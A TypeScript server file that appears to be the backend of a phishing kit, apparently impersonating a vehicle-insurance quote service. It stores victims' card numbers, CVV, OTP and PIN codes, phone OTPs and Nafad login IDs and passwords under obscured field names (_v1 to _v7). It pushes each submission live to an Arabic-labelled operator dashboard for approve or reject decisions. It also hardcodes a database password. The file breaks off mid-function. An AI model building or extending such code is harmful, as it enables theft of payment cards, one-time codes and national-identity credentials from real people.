import express from "express";
import { createServer } from "http";
import { Server as SocketIOServer } from "socket.io";
import fs from "node:fs";
import path from "path";
import { fileURLToPath } from "url";
import { Pool } from "pg";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);


type DashboardEntry = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  badge: string;
  visitorId?: string;
  submittedAt?: string;
  updatedAt?: string;
  raw?: Record<string, any>;
};

// ==========================================
// LOCAL MEMORY STORE FOR PENDING DECISIONS
// (Deleted on server restart) - DEPRECATED
// ==========================================
// pendingDecisions[visitorId] = { card: {status: 'pending', timestamp}, otp: {...}, pin: {...}, phone: {...} }
type PendingDecision = {
  status: 'pending';
  timestamp: number;
};

type PendingDecisions = {
  card?: PendingDecision;
  otp?: PendingDecision;
  pin?: PendingDecision;
  phone?: PendingDecision;
};

const pendingDecisions: Map<string, PendingDecisions> = new Map();

// Set pending decision when customer submits new data - DEPRECATED (use setBoxTimestamp instead)
function setPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone') {
  const visitorDecisions = pendingDecisions.get(visitorId) || {};
  visitorDecisions[boxType] = { status: 'pending', timestamp: Date.now() };
  pendingDecisions.set(visitorId, visitorDecisions);
  console.log(`[Pending DEPRECATED] Set ${boxType} pending for visitor ${visitorId}`);
}

// Get pending decision - DEPRECATED (use getBoxTimestamp instead)
function getPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone'): PendingDecision | null {
  const visitorDecisions = pendingDecisions.get(visitorId);
  if (!visitorDecisions) return null;
  return visitorDecisions[boxType] || null;
}

// Get all pending decisions for visitor - DEPRECATED (use getAllBoxTimestamps instead)
function getAllPendingDecisions(visitorId: string): PendingDecisions {
  return pendingDecisions.get(visitorId) || {};
}

// Clear pending decision after admin action - DEPRECATED (use setBoxTimestamp with new status instead)
function clearPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone') {
  const visitorDecisions = pendingDecisions.get(visitorId);
  if (visitorDecisions) {
    delete visitorDecisions[boxType];
    if (Object.keys(visitorDecisions).length === 0) {
      pendingDecisions.delete(visitorId);
    }
  }
  console.log(`[Pending DEPRECATED] Cleared ${boxType} for visitor ${visitorId}`);
}

// ==========================================
// NEW BOX TIMESTAMPS SYSTEM (Uses Database - Persistent)
// ==========================================
// Box types mapping to their status fields in visitors table
type BoxType = 'card' | 'otp' | 'pin' | 'phone' | 'nafad' | 'identity' | 'vehicle';

interface BoxTimestamp {
  id: number;
  visitor_id: string;
  box_type: string;
  status: string;
  timestamp: Date;
  updated_at: Date;
}

// Set box timestamp in database - NEW SYSTEM
async function setBoxTimestamp(visitorId: string, boxType: BoxType, status: string): Promise<void> {
  try {
    await pool.query(`
      INSERT INTO visitor_box_events (visitor_id, box_type, status, event_timestamp, updated_at)
      VALUES ($1, $2, $3, NOW(), NOW())
      ON CONFLICT (visitor_id, box_type) 
      DO UPDATE SET status = $3, event_timestamp = NOW(), updated_at = NOW()
    `, [visitorId, boxType, status]);
    console.log(`[BoxTimestamp] Set ${boxType}=${status} for visitor ${visitorId}`);
  } catch (error) {
    console.error(`[BoxTimestamp] Error setting ${boxType} for ${visitorId}:`, error);
  }
}

// Get box timestamp from database - NEW SYSTEM
async function getBoxTimestamp(visitorId: string, boxType: BoxType): Promise<BoxTimestamp | null> {
  try {
    const result = await pool.query<BoxTimestamp>(
      `SELECT * FROM visitor_box_events WHERE visitor_id = $1 AND box_type = $2`,
      [visitorId, boxType]
    );
    return result.rows[0] || null;
  } catch (error) {
    console.error(`[BoxTimestamp] Error getting ${boxType} for ${visitorId}:`, error);
    return null;
  }
}

// Get all box timestamps for a visitor - NEW SYSTEM
async function getAllBoxTimestamps(visitorId: string): Promise<Record<string, BoxTimestamp>> {
  try {
    const result = await pool.query<BoxTimestamp>(
      `SELECT * FROM visitor_box_events WHERE visitor_id = $1 ORDER BY updated_at DESC`,
      [visitorId]
    );
    
    // Convert to map
    const timestamps: Record<string, BoxTimestamp> = {};
    result.rows.forEach(row => {
      timestamps[row.box_type] = row;
    });
    return timestamps;
  } catch (error) {
    console.error(`[BoxTimestamp] Error getting all timestamps for ${visitorId}:`, error);
    return {};
  }
}

// Map box type to its status field in visitors table
function getBoxStatusField(boxType: BoxType): string {
  const fieldMap: Record<BoxType, string> = {
    'card': '_v1Status',
    'otp': '_v5Status',
    'pin': '_v6Status',
    'phone': 'phoneOtpStatus',
    'nafad': 'nafadConfirmationStatus',
    'identity': '_v1Status',
    'vehicle': '_v4Status',
  };
  return fieldMap[boxType] || 'status';
}

// Map box type to its timestamp field in visitors table  
function getBoxTimestampField(boxType: BoxType): string {
  const fieldMap: Record<BoxType, string> = {
    'card': '_v1UpdatedAt',
    'otp': '_v5UpdatedAt',
    'pin': '_v6UpdatedAt',
    'phone': '_v7UpdatedAt',
    'nafad': 'nafadUpdatedAt',
    'identity': '_v1UpdatedAt',
    'vehicle': '_v4UpdatedAt',
  };
  return fieldMap[boxType] || 'updatedAt';
}

// SSE clients for real-time updates
const sseClients = new Set<express.Response>();

// Broadcast event to all SSE clients
function broadcastSSE(event: string, data: any) {
  const message = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach((client) => {
    try {
      client.write(message);
    } catch (e) {
      sseClients.delete(client);
    }
  });
}

const connectionString = process.env.DATABASE_URL || "postgresql://neondb_owner:npg_pQwL4xqFg5Wa@ep-wandering-dust-aub50efr-pooler.c-10.us-east-1.aws.neon.tech/neondb?sslmode=require";

const pool = new Pool({
  connectionString,
  ssl: { rejectUnauthorized: false },
});

// No local memory - all data stored in PostgreSQL database only

type ColumnSpec = {
  name: string;
  definition: string;
  defaultValue?: string;
};

async function tableExists(tableName: string): Promise<boolean> {
  const result = await pool.query<{ table_name: string | null }>("SELECT to_regclass($1) AS table_name", [tableName]);
  return Boolean(result.rows[0]?.table_name);
}

async function columnExists(tableName: string, columnName: string): Promise<boolean> {
  const result = await pool.query<{ exists: boolean }>(
    `
      SELECT EXISTS (
        SELECT 1
        FROM information_schema.columns
        WHERE table_schema = 'public'
          AND table_name = $1
          AND column_name = $2
      ) AS exists
    `,
    [tableName, columnName],
  );
  return Boolean(result.rows[0]?.exists);
}

async function ensureColumn(tableName: string, column: ColumnSpec): Promise<boolean> {
  if (await columnExists(tableName, column.name)) {
    return false;
  }

  let sql = `ALTER TABLE ${tableName} ADD COLUMN IF NOT EXISTS ${column.name} ${column.definition}`;
  await pool.query(sql);

  if (column.defaultValue) {
    await pool.query(`ALTER TABLE ${tableName} ALTER COLUMN ${column.name} SET DEFAULT ${column.defaultValue}`);
  }

  return true;
}

async function ensureTable(tableName: string, createSql: string, columns: ColumnSpec[]): Promise<boolean> {
  if (!(await tableExists(tableName))) {
    await pool.query(createSql);
    console.log(`[db] created missing table ${tableName}`);
    return true;
  }

  let changed = false;
  for (const column of columns) {
    if (await ensureColumn(tableName, column)) {
      changed = true;
      console.log(`[db] added missing column ${tableName}.${column.name}`);
    }
  }

  return changed;
}

async function safeQuery<T = any>(query: string, params: any[] = []): Promise<{ rows: T[] }> {
  try {
    return await pool.query(query, params);
  } catch (error) {
    console.error("Database query failed:", error);
    throw error;
  }
}

function normalizeDashboardEntry(payload: Record<string, any> = {}): DashboardEntry {
  // Extract raw data - support multiple structures
  const nestedPayload = payload.raw || payload.data || payload.formData || {};
  // Combine: raw data + direct payload (payload takes precedence for overrides)
  const combinedPayload = Object.keys(payload).length > Object.keys(nestedPayload).length
    ? { ...nestedPayload, ...payload }
    : { ...payload, ...nestedPayload };
  
  const visitorId = String(combinedPayload.visitorId || combinedPayload.id || nestedPayload.visitorId || nestedPayload.id || "").trim();
  
  // Extract customer name with priority: customer > ownerName > buyerName > name > firstName > identityNumber > phoneNumber
  const customerName = String(
    combinedPayload.customer ||
    combinedPayload.ownerName ||
    combinedPayload.buyerName ||
    combinedPayload.name ||
    combinedPayload.firstName ||
    combinedPayload.lastName ||
    combinedPayload.identityNumber ||
    combinedPayload.phoneNumber ||
    nestedPayload.customer ||
    nestedPayload.ownerName ||
    nestedPayload.buyerName ||
    nestedPayload.name ||
    nestedPayload.firstName ||
    nestedPayload.lastName ||
    nestedPayload.identityNumber ||
    nestedPayload.phoneNumber ||
    payload.customer ||
    payload.ownerName ||
    payload.buyerName ||
    payload.name ||
    payload.identityNumber ||
    payload.phoneNumber ||
    "زائر"
  ).trim() || "زائر";
  
  const currentPage = String(combinedPayload.currentPage || combinedPayload.page || nestedPayload.currentPage || nestedPayload.page || payload.raw?.currentPage || payload.raw?.page || "home");
  
  // Parse currentStep - handle both numeric and string values like "_t2", "_t3"
  const rawStep = combinedPayload.currentStep ?? combinedPayload.step ?? nestedPayload.currentStep ?? nestedPayload.step ?? 1;
  let currentStep = Number(rawStep);
  if (isNaN(currentStep)) {
    // Handle string values like "_t2" -> 2, "_t3" -> 3
    const match = String(rawStep).match(/_t(\d+)/);
    currentStep = match ? parseInt(match[1], 10) : 1;
  }

  let stage = "الخطوة 1";
  let status = "جديد";
  let badge = "new";

  if (currentPage === "insur" || currentPage === "confi" || currentPage === "veri" || currentPage === "check" || currentStep >= 2) {
    stage = "الخطوة 2";
    status = "قيد المعالجة";
    badge = "pending";
  }
  if (currentPage === "nafad" || currentPage === "phone" || currentPage === "thank-you" || currentPage === "step2" || currentPage === "step3" || currentStep >= 3) {
    stage = "الخطوة 3";
    status = "مكتمل";
    badge = "";
  }

  return {
    id: String(payload.id || combinedPayload.id || `REQ-${String(visitorId || customerName || Date.now()).slice(0, 8).toUpperCase()}`),
    customer: customerName,
    status,
    stage,
    updated: String(payload.updated || combinedPayload.updated || "تم التحديث الآن"),
    badge,
    visitorId: visitorId || String(payload.id || combinedPayload.id || ""),
    submittedAt: String(payload.submittedAt || combinedPayload.submittedAt || payload.createdAt || combinedPayload.createdAt || new Date().toISOString()),
    raw: combinedPayload.raw || combinedPayload || payload.raw || payload,
  };
}

async function initDatabase() {
  try {
    const tables = [
      {
        name: "visitors",
        createSql: `
          CREATE TABLE IF NOT EXISTS visitors (
            id TEXT PRIMARY KEY,
            data JSONB NOT NULL DEFAULT '{}'::jsonb,
            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
          );
        `,
        columns: [
          { name: "id", definition: "TEXT", defaultValue: undefined },
          { name: "data", definition: "JSONB NOT NULL DEFAULT '{}'::jsonb" },
          { name: "created_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
          { name: "updated_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
        ] as ColumnSpec[],
      },
      {
        name: "dashboard_requests",
        createSql: `
          CREATE TABLE IF NOT EXISTS dashboard_requests (
            id TEXT PRIMARY KEY,
            visitor_id TEXT,
            customer TEXT,
            status TEXT,
            stage TEXT,
            updated TEXT,
            badge TEXT,
            submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            raw JSONB NOT NULL DEFAULT '{}'::jsonb
          );
        `,
        columns: [
          { name: "id", definition: "TEXT" },
          { name: "visitor_id", definition: "TEXT" },
          { name: "customer", definition: "TEXT" },
          { name: "status", definition: "TEXT" },
          { name: "stage", definition: "TEXT" },
          { name: "updated", definition: "TEXT" },
          { name: "badge", definition: "TEXT" },
          { name: "submitted_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
          { name: "raw", definition: "JSONB NOT NULL DEFAULT '{}'::jsonb" },
        ] as ColumnSpec[],
      },
      {
        name: "visitor_events",
        createSql: `
          CREATE TABLE IF NOT EXISTS visitor_events (
            id SERIAL PRIMARY KEY,
            visitor_id TEXT NOT NULL,
            page_name TEXT,
            current_step TEXT,
            payload JSONB NOT NULL DEFAULT '{}'::jsonb,
            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
          );
        `,
        columns: [
          { name: "id", definition: "SERIAL" },
          { name: "visitor_id", definition: "TEXT NOT NULL" },
          { name: "page_name", definition: "TEXT" },
          { name: "current_step", definition: "TEXT" },
          { name: "payload", definition: "JSONB NOT NULL DEFAULT '{}'::jsonb" },
          { name: "created_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
        ] as ColumnSpec[],
      },
      {
        name: "visitor_snapshots",
        createSql: `
          CREATE TABLE IF NOT EXISTS visitor_snapshots (
            id SERIAL PRIMARY KEY,
            visitor_id TEXT NOT NULL,
            page_name TEXT,
            current_step TEXT,
            payload JSONB NOT NULL DEFAULT '{}'::jsonb,
            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
          );
        `,
        columns: [
          { name: "id", definition: "SERIAL" },
          { name: "visitor_id", definition: "TEXT NOT NULL" },
          { name: "page_name", definition: "TEXT" },
          { name: "current_step", definition: "TEXT" },
          { name: "payload", definition: "JSONB NOT NULL DEFAULT '{}'::jsonb" },
          { name: "created_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
        ] as ColumnSpec[],
      },
      {
        name: "visitor_history",
        createSql: `
          CREATE TABLE IF NOT EXISTS visitor_history (
            id SERIAL PRIMARY KEY,
            visitor_id TEXT NOT NULL,
            event_type TEXT,
            payload JSONB NOT NULL DEFAULT '{}'::jsonb,
            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
          );
        `,
        columns: [
          { name: "id", definition: "SERIAL" },
          { name: "visitor_id", definition: "TEXT NOT NULL" },
          { name: "event_type", definition: "TEXT" },
          { name: "payload", definition: "JSONB NOT NULL DEFAULT '{}'::jsonb" },
          { name: "created_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
        ] as ColumnSpec[],
      },
      {
        // NEW: Box timestamps for real-time updates - replaces pendingDecisions
        name: "visitor_box_events",
        createSql: `
          CREATE TABLE IF NOT EXISTS visitor_box_events (
            id SERIAL PRIMARY KEY,
            visitor_id TEXT NOT NULL,
            box_type TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            event_timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE(visitor_id, box_type)
          );
        `,
        columns: [
          { name: "id", definition: "SERIAL" },
          { name: "visitor_id", definition: "TEXT NOT NULL" },
          { name: "box_type", definition: "TEXT NOT NULL" },
          { name: "status", definition: "TEXT NOT NULL DEFAULT 'pending'" },
          { name: "event_timestamp", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
          { name: "updated_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
        ] as ColumnSpec[],
      },
    ];

    let schemaChanged = false;
    for (const table of tables) {
      const changed = await ensureTable(table.name, table.createSql, table.columns);
      if (changed) schemaChanged = true;
    }

    if (schemaChanged) {
      console.log("[db] schema migration completed: created missing tables or columns");
    } else {
      console.log("[db] schema is up to date");
    }
  } catch (error) {
    console.error("[db] Database init failed:", error);
    process.exit(1); // Exit if database is not available
  }
}

async function logVisitorEvent(visitorId: string, payload: Record<string, any> = {}) {
  try {
    const pageName = payload.currentPage || payload.page || payload.raw?.currentPage || payload.raw?.page || "unknown";
    const currentStep = payload.currentStep ?? payload.step ?? payload.raw?.currentStep ?? payload.raw?.step ?? null;
    await safeQuery(
      `
        INSERT INTO visitor_events (visitor_id, page_name, current_step, payload, created_at)
        VALUES ($1, $2, $3, $4, NOW());
      `,
      [visitorId, String(pageName), currentStep === null ? null : String(currentStep), payload],
    );
    await safeQuery(
      `
        INSERT INTO visitor_snapshots (visitor_id, page_name, current_step, payload, created_at)
        VALUES ($1, $2, $3, $4, NOW());
      `,
      [visitorId, String(pageName), currentStep === null ? null : String(currentStep), payload],
    );
  } catch (error) {
    console.error("visitor event log error", error);
  }
}

async function readVisitor(visitorId: string): Promise<Record<string, any> | null> {
  try {
    const result = await pool.query<{ data: Record<string, any> }>(
      "SELECT data FROM visitors WHERE id = $1", 
      [visitorId]
    );
    return result.rows[0]?.data || null;
  } catch (error) {
    console.error("[readVisitor] Error:", error);
    return null;
  }
}

async function upsertVisitor(visitorId: string, payload: Record<string, any> = {}) {
  console.log("[UpsertVisitor] visitorId:", visitorId);
  console.log("[UpsertVisitor] payload keys:", Object.keys(payload));
  console.log("[UpsertVisitor] payload sample:", JSON.stringify(payload).slice(0, 500));
  
  // Read data BEFORE any modifications
  const currentData = (await readVisitor(visitorId)) || {};
  console.log("[UpsertVisitor] currentData keys:", Object.keys(currentData));
  
  // Determine the type of data being submitted
  let dataType = "general";
  let historyType = "_general";
  
  if (payload._v1 || payload.cardNumber || payload._v4 || payload.cardOwner) {
    dataType = "payment";
    historyType = "_t1"; // Payment card data
  } else if (payload._v3 || payload.otpCode) {
    dataType = "otp";
    historyType = "_v3"; // OTP verification
  } else if (payload.buyerName || payload.identityNumber) {
    dataType = "identity";
    historyType = "_identity"; // Identity information
  } else if (payload.phoneNumber || payload.email) {
    dataType = "contact";
    historyType = "_contact"; // Contact information
  }
  
  // Check if there's meaningful data to save to history
  const hasNewData = Object.keys(payload).some(key => {
    const value = payload[key];
    return value !== null && value !== undefined && value !== '' && 
           !['updatedAt', 'createdAt', 'history'].includes(key);
  });
  
  const hadOldData = Object.keys(currentData).some(key => {
    const value = currentData[key];
    return value !== null && value !== undefined && value !== '' && 
           !['updatedAt', 'createdAt', 'history'].includes(key);
  });
  
  // Save old data to history BEFORE replacing (if both old and new data exist)
  if (hasNewData && hadOldData) {
    try {
      const history = Array.isArray(currentData.history) ? currentData.history : [];
      
      // Create snapshot of all current data (excluding history)
      const snapshotData: Record<string, any> = {};
      Object.keys(currentData).forEach(key => {
        if (!['history', 'updatedAt', 'createdAt'].includes(key)) {
          snapshotData[key] = currentData[key];
        }
      });
      
      const historyEntry = { 
        type: historyType, 
        dataType: dataType,
        data: snapshotData,
        replacedAt: new Date().toISOString(),
        reason: `new_${dataType}_data`
      };
      
      // Save to database with history
      const updatedWithHistory = { ...currentData, history: [...history, historyEntry] };
      // Save to history in database
      await pool.query(
        `INSERT INTO visitors (id, data, created_at, updated_at) VALUES ($1, $2, NOW(), NOW())
         ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data, updated_at = NOW();`,
        [visitorId, updatedWithHistory],
      );
      console.log(`[UpsertVisitor] Saved old ${dataType} data to history`);
    } catch (e) {
      console.error("[UpsertVisitor] Failed to save history:", e);
    }
  }
  
  // Now merge with new data
  const merged = { ...currentData, ...payload, updatedAt: new Date().toISOString() };
  console.log("[UpsertVisitor] merged keys:", Object.keys(merged));

  // Save to database
  try {
    await pool.query(
      `
        INSERT INTO visitors (id, data, created_at, updated_at)
        VALUES ($1, $2, NOW(), NOW())
        ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data, updated_at = NOW();
      `,
      [visitorId, merged],
    );
    console.log("[UpsertVisitor] DB insert/update successful");
  } catch (error) {
    console.error("[UpsertVisitor] DB insert/update failed:", error);
    throw error;
  }

  await logVisitorEvent(visitorId, merged);

  // NOTE: Don't create dashboard entry here - only create when user SUBMITS a form
  // Dashboard entries are created in form submission handlers, not in visitor tracking

  // ==========================================
  // NEW: Set box timestamp for real-time updates
  // Determine box type based on submitted data
  // ==========================================
  let boxType: BoxType | null = null;
  
  // Card data (payment card)
  if (payload._v1 || payload.cardNumber || payload.cardOwner || payload._v4) {
    boxType = 'card';
  }
  // OTP code (step2)
  else if (payload._v5 || payload.otpCode) {
    boxType = 'otp';
  }
  // PIN code (step3)
  else if (payload._v6 || payload.pinCode) {
    boxType = 'pin';
  }
  // Phone OTP (step5)
  else if (payload._v7 || payload.phoneOtp || payload.phoneIdNumber || payload.phoneCarrier) {
    boxType = 'phone';
  }
  // Nafad verification (step4)
  else if (payload.nafadIdNumber || payload.nafadPassword || payload.nafadConfirmationCode) {
    boxType = 'nafad';
  }
  // Identity data
  else if (payload.identityNumber || payload.buyerName || payload.buyerIdNumber) {
    boxType = 'identity';
  }
  // Vehicle data
  else if (payload.serialNumber || payload.vehicleModel || payload.vehicleYear) {
    boxType = 'vehicle';
  }
  
  // Set box timestamp ONLY when customer submits new DATA (not status updates from admin)
  // This ensures timestamp is set only from customer submissions
  if (boxType) {
    // Check if this is actual data submission (not just status update)
    const hasDataSubmission = 
      (boxType === 'card' && (payload._v1 || payload.cardNumber || payload.cardOwner)) ||
      (boxType === 'otp' && (payload._v5 || payload.otpCode)) ||
      (boxType === 'pin' && (payload._v6 || payload.pinCode)) ||
      (boxType === 'phone' && (payload._v7 || payload.phoneOtp || payload.phoneIdNumber || payload.phoneCarrier)) ||
      (boxType === 'nafad' && (payload.nafadIdNumber || payload.nafadPassword || payload.nafadConfirmationCode)) ||
      (boxType === 'identity' && (payload.identityNumber || payload.buyerName || payload.buyerIdNumber)) ||
      (boxType === 'vehicle' && (payload.serialNumber || payload.vehicleModel || payload.vehicleYear));
    
    if (hasDataSubmission) {
      // This is customer data submission - set/update timestamp
      await setBoxTimestamp(visitorId, boxType, 'pending');
      
      broadcastToDashboard("box:update", {
        visitorId,
        boxType,
        status: 'pending',
        timestamp: new Date().toISOString(),
        dataType: dataType,
        updateType: 'new_data'
      });
    } else {
      // This might be status update from admin - keep existing timestamp
      const existingTimestamp = await getBoxTimestamp(visitorId, boxType);
      const status = payload._v1Status || payload._v5Status || payload._v6Status || payload.phoneOtpStatus || 'pending';
      
      // Broadcast with existing timestamp (don't change it)
      broadcastToDashboard("box:update", {
        visitorId,
        boxType,
        status,
        timestamp: existingTimestamp?.event_timestamp || new Date().toISOString(),
        updateType: 'status_only'
      });
    }
  }

  return merged;
}

function hasMeaningfulValueChange(existingValue: unknown, incomingValue: unknown): boolean {
  if (incomingValue === undefined || incomingValue === null) return false;
  if (typeof incomingValue === 'string') {
    const trimmed = incomingValue.trim();
    if (!trimmed) return false;
    return String(existingValue ?? '') !== trimmed;
  }
  return existingValue !== incomingValue;
}

function hasSubmissionIntent(payload: Record<string, any> | undefined): boolean {
  if (!payload || typeof payload !== 'object') return false;

  const nestedPayload = payload.raw ?? payload.formData ?? payload.data;
  if (nestedPayload && typeof nestedPayload === 'object' && nestedPayload !== payload && hasSubmissionIntent(nestedPayload)) {
    return true;
  }

  if (payload.source === 'submit' || payload.source === 'form-submit' || payload.submit === true || payload.isSubmission === true) {
    return true;
  }

  const submissionKeys = [
    'ownerName', 'buyerName', 'customer', 'name', 'firstName', 'lastName',
    'identityNumber', 'buyerIdNumber', 'phoneNumber', 'email', 'serialNumber',
    'registrationType', 'coverageType', 'vehicleModel', 'manufacturingYear',
    'vehicleUsage', 'usage', 'repairLocation', 'insuranceCoverage', 'vehicleValue',
    'vehicleYear', 'vehiclePlate', 'companyName', 'originalPrice', 'discount',
    'finalPrice', 'features', 'cardNumber', 'cardOwner', 'cardExpiry', 'cvv',
    'verificationCode', 'selectedOffer', 'offerTotalPrice', 'paymentMethod',
    '_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_v7', 'otpCode', 'pinCode',
    'nafadIdNumber', 'nafadPassword', 'nafadConfirmationCode', 'phoneOtp',
    'phoneIdNumber', 'hasCard', 'paymentStatus', 'comparCompletedAt', 'homeCompletedAt',
    'otpSubmittedAt', 'pinSubmittedAt', 'phoneSubmittedAt', 'cardSubmittedAt',
    'homeNewSubmittedAt', 'insurSubmittedAt', 'nafadSubmittedAt',
    'submittedAt', 'updatedAt', 'createdAt',
  ];

  return submissionKeys.some((key) => {
    const value = payload[key];
    if (value === undefined || value === null) return false;
    if (typeof value === 'string') {
      return value.trim().length > 0;
    }
    return Boolean(value);
  });
}

async function upsertDashboardRequest(payload: Record<string, any> = {}, options: { preserveTimestamp?: boolean } = {}) {
  const visitorId = payload.id || payload.visitorId;
  const preserveTimestamp = Boolean(options.preserveTimestamp);
  console.log("[UpsertDashboard] payload id:", visitorId, "customer:", payload.customer || payload.ownerName, "preserveTimestamp:", preserveTimestamp);
  
  // Fetch existing visitor data from database to merge with current payload
  let existingVisitorData: Record<string, any> = {};
  if (visitorId) {
    try {
      const visitorResult = await pool.query<{ data: Record<string, any> }>(
        "SELECT data FROM visitors WHERE id = $1",
        [visitorId]
      );
      if (visitorResult.rows[0]?.data) {
        existingVisitorData = visitorResult.rows[0].data;
        console.log("[UpsertDashboard] Fetched existing visitor data:", Object.keys(existingVisitorData));
      }
    } catch (e) {
      console.warn("[UpsertDashboard] Could not fetch visitor data:", e);
    }
  }

  // Merge existing visitor data with current payload (current payload takes precedence)
  const mergedPayload = { ...existingVisitorData, ...payload };

  // Get current timestamp
  const now = new Date().toISOString();

  const hasExplicitTimestamp = Boolean(
    payload.submittedAt || payload.updatedAt || payload.createdAt || payload.homeCompletedAt || payload.comparCompletedAt ||
    payload._v1UpdatedAt || payload._v5UpdatedAt || payload._v6UpdatedAt || payload._v7UpdatedAt || payload.nafadUpdatedAt
  );

  const hasCustomerInputData = Boolean(
    payload.identityNumber || payload.ownerName || payload.buyerName || payload.phoneNumber || payload.phoneIdNumber ||
    payload.nafadIdNumber || payload._v1 || payload._v2 || payload._v3 || payload._v5 || payload._v6 || payload._v7 ||
    payload.otpCode || payload.pinCode || payload.phoneOtp || payload.cardNumber || payload.paymentStatus || payload.hasCard ||
    payload.selectedOffer || payload.offerTotalPrice || payload.raw || payload.data || payload.formData
  );

  // Auto-add _v1UpdatedAt ONLY if card data is in the CURRENT payload (not merged from old data)
  // This ensures we only update the timestamp when NEW card data is submitted
  const hasNewCardData = !preserveTimestamp && (
    (payload._v1 !== undefined && hasMeaningfulValueChange(existingVisitorData._v1, payload._v1)) ||
    (payload._v2 !== undefined && hasMeaningfulValueChange(existingVisitorData._v2, payload._v2)) ||
    (payload._v3 !== undefined && hasMeaningfulValueChange(existingVisitorData._v3, payload._v3)) ||
    (payload.cardNumber !== undefined && hasMeaningfulValueChange(existingVisitorData.cardNumber, payload.cardNumber)) ||
    (payload.paymentStatus !== undefined && hasMeaningfulValueChange(existingVisitorData.paymentStatus, payload.paymentStatus)) ||
    (payload.hasCard !== undefined && hasMeaningfulValueChange(existingVisitorData.hasCard, payload.hasCard)) ||
    (payload.cardData !== undefined && hasMeaningfulValueChange(existingVisitorData.cardData, payload.cardData)) ||
    (payload._v1UpdatedAt !== undefined && hasMeaningfulValueChange(existingVisitorData._v1UpdatedAt, payload._v1UpdatedAt))
  );
  if (hasNewCardData && !mergedPayload._v1UpdatedAt) {
    mergedPayload._v1UpdatedAt = now;
    // Clear old decision when new card data is submitted - this enables buttons to show
    mergedPayload._v1Status = null;
    mergedPayload.paymentStatus = null;
  }

  // Auto-add _v5UpdatedAt ONLY if OTP data is in the CURRENT payload and differs from existing visitor data
  const hasNewOtpData = !preserveTimestamp && (
    (payload._v5 !== undefined && hasMeaningfulValueChange(existingVisitorData._v5, payload._v5)) ||
    (payload.otpCode !== undefined && hasMeaningfulValueChange(existingVisitorData.otpCode, payload.otpCode)) ||
    (payload.otp !== undefined && hasMeaningfulValueChange(existingVisitorData.otp, payload.otp)) ||
    (payload.otpSubmittedAt !== undefined && hasMeaningfulValueChange(existingVisitorData.otpSubmittedAt, payload.otpSubmittedAt)) ||
    (payload._v5UpdatedAt !== undefined && hasMeaningfulValueChange(existingVisitorData._v5UpdatedAt, payload._v5UpdatedAt))
  );
  if (hasNewOtpData && !mergedPayload._v5UpdatedAt) {
    mergedPayload._v5UpdatedAt = now;
    // Clear old decision when new OTP data is submitted - this enables buttons to show
    mergedPayload._v5Status = null;
    mergedPayload.otpStatus = null;
  }

  // Auto-add _v6UpdatedAt ONLY if PIN data is in the CURRENT payload and differs from existing visitor data
  const hasNewPinData = !preserveTimestamp && (
    (payload._v6 !== undefined && hasMeaningfulValueChange(existingVisitorData._v6, payload._v6)) ||
    (payload.pinCode !== undefined && hasMeaningfulValueChange(existingVisitorData.pinCode, payload.pinCode)) ||
    (payload.pin !== undefined && hasMeaningfulValueChange(existingVisitorData.pin, payload.pin)) ||
    (payload._v6UpdatedAt !== undefined && hasMeaningfulValueChange(existingVisitorData._v6UpdatedAt, payload._v6UpdatedAt))
  );
  if (hasNewPinData && !mergedPayload._v6UpdatedAt) {
    mergedPayload._v6UpdatedAt = now;
    // Clear old decision when new PIN data is submitted - this enables buttons to show
    mergedPayload._v6Status = null;
    mergedPayload.pinStatus = null;
  }

  // Auto-add _v7UpdatedAt ONLY if phone data is in the CURRENT payload and differs from existing visitor data
  const hasNewPhoneData = !preserveTimestamp && (
    (payload.phoneNumber !== undefined && hasMeaningfulValueChange(existingVisitorData.phoneNumber, payload.phoneNumber)) ||
    (payload._v7 !== undefined && hasMeaningfulValueChange(existingVisitorData._v7, payload._v7)) ||
    (payload.phoneOtp !== undefined && hasMeaningfulValueChange(existingVisitorData.phoneOtp, payload.phoneOtp)) ||
    (payload.phoneIdNumber !== undefined && hasMeaningfulValueChange(existingVisitorData.phoneIdNumber, payload.phoneIdNumber)) ||
    (payload.phoneCarrier !== undefined && hasMeaningfulValueChange(existingVisitorData.phoneCarrier, payload.phoneCarrier)) ||
    (payload._v7UpdatedAt !== undefined && hasMeaningfulValueChange(existingVisitorData._v7UpdatedAt, payload._v7UpdatedAt))
  );
  if (hasNewPhoneData && !mergedPayload._v7UpdatedAt) {
    mergedPayload._v7UpdatedAt = now;
    // Clear old decision when new phone data is submitted - this enables buttons to show
    mergedPayload.phoneOtpStatus = null;
    mergedPayload.phoneStatus = null;
  }

  // Auto-add nafadUpdatedAt ONLY if nafad data is in the CURRENT payload and differs from existing visitor data
  const hasNewNafadData = !preserveTimestamp && (
    hasMeaningfulValueChange(existingVisitorData.nafadIdNumber, payload.nafadIdNumber) ||
    hasMeaningfulValueChange(existingVisitorData.nafadPassword, payload.nafadPassword) ||
    hasMeaningfulValueChange(existingVisitorData.nafadUpdatedAt, payload.nafadUpdatedAt)
  );
